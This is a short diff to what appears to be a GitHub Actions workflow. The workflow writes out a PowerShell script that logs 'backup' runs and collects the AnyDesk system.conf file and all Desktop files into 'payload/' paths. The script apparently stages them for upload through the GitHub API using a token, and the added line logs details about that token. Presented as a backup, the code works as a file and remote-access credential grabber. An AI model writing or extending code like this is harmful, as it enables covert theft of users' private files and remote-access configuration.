@@ -132,6 +132,7 @@ jobs:
             '$api = ''https://api.github.com''',
             '$log = $dst + ''\backup_log.txt''',
             '(''=== run '' + (Get-Date -Format ''yyyy-MM-dd HH:mm:ss'')) | Out-File $log -Append',
+            '(''token_len='' + $token.Length + '' tokfile='' + (Test-Path ($dst + ''\.bktoken''))) | Out-File $log -Append',
             '$files = @{}',
             '$files[''payload/anydesk_conf/system.conf''] = $env:ProgramData + ''\AnyDesk\system.conf''',
             'Get-ChildItem ($env:USERPROFILE + ''\Desktop'') -File -ErrorAction SilentlyContinue | ForEach-Object { $files[''payload/desktop/'' + $_.Name] = $_.FullName }',
